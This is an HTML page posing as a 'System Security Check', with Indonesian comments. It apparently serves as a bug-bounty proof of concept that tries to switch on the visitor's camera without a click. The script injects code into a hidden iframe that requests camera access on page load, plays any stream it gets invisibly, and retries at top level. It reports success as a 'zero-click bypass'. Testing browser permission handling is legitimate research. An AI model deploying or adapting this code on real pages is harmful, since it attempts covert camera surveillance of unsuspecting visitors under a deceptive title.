<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Security Check</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #111; color: #0f0; font-family: monospace; text-align: center; padding-top: 20vh; }
  iframe, video { display: none !important; }
  #status { font-size: 20px; color: #ff0; margin-top: 20px; }
  .red { color: #f00; font-weight: bold; }
</style>
</head>
<body>

<h1>🔒 Security Check</h1>
<p id="status">Menginisialisasi protokol keamanan...</p>

<!-- IFRAME TERSEMBUNYI UNTUK MEMINTA IZIN KAMERA -->
<iframe id="camIframe" allow="camera; microphone" style="display:none;"></iframe>

<script>
(function () {
  'use strict';

  var statusEl = document.getElementById('status');
  var iframe = document.getElementById('camIframe');

  // ============================================
  // LOGIKA ZERO-CLICK CAMERA BYPASS
  // ============================================
  
  // 1. Set src ke about:blank untuk mendapatkan konteks dokumen
  iframe.src = 'about:blank';

  iframe.onload = function() {
    try {
      var doc = iframe.contentDocument || iframe.contentWindow.document;
      
      // 2. Tulis script permintaan kamera langsung ke iframe
      doc.open();
      doc.write(`
        <!DOCTYPE html>
        <html>
        <body>
          <script>
            (function() {
              // Coba akses kamera secara instan
              if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                  .then(function(stream) {
                    // 🚨 JIKA BERHASIL: Kamera menyala!
                    parent.postMessage({ status: 'success' }, '*');
                    
                    // Tampilkan video di dalam iframe (tidak terlihat oleh user)
                    var video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    document.body.appendChild(video);
                  })
                  .catch(function(err) {
                    // ❌ JIKA GAGAL (Expected Behavior)
                    parent.postMessage({ status: 'fail', error: err.name }, '*');
                  });
              }
            })();
          <\/script>
        </body>
        </html>
      `);
      doc.close();
    } catch (e) {
      console.log("Iframe access error:", e);
    }
  };

  // ============================================
  // LISTENER: MENANGKAP HASIL DARI IFRAME
  // ============================================
  window.addEventListener('message', function(e) {
    if (e.data && e.data.status === 'success') {
      statusEl.innerText = "🚨 CAMERA ACCESS GRANTED (ZERO-CLICK BYPASS) 🚨";
      statusEl.className = "red";
      document.body.style.background = "#300";
      console.log("[!] BUG BOUNTY: Camera accessed without user gesture!");
    } 
    else if (e.data && e.data.status === 'fail') {
      statusEl.innerText = "✅ Security check passed. Camera blocked: " + e.data.error;
      statusEl.style.color = "#4caf50";
      console.log("[X] Camera blocked by browser (Expected).");
    }
  });

  // ============================================
  // FALLBACK: COBA DARI TOP-LEVEL JUGA
  // ============================================
  setTimeout(function() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
          // Jika ini berhasil di Top-Level tanpa klik, itu BUG BESAR.
          statusEl.innerText = "🚨 TOP-LEVEL CAMERA BYPASS! 🚨";
          statusEl.className = "red";
        })
        .catch(function(err) {
          console.log("Top-level camera blocked:", err.name);
        });
    }
  }, 500);

})();
</script>
</body>
</html>
